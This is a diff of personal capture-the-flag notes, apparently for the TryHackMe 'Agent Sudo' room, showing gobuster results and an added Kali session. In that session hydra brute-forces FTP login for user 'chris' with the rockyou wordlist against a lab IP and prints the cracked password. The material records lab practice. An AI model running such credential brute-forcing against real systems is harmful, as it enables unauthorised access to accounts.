@@ -61,10 +61,20 @@ Starting gobuster in directory enumeration mode
 /index.php            (Status: 200) [Size: 218]
 
 --lame result
-
+![[Pasted image 20251129142912.png]]
 
 
 ![[Pasted image 20251129135628.png]]
 
 ![[Pasted image 20251129135700.png]]
+
+┌──(kali㉿kali)-[~/THM/AgentSudo]
+└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.64.132.105 ftp
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-29 14:27:27
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.64.132.105:21/
+[21][ftp] host: 10.64.132.105   login: chris   password: crystal
 
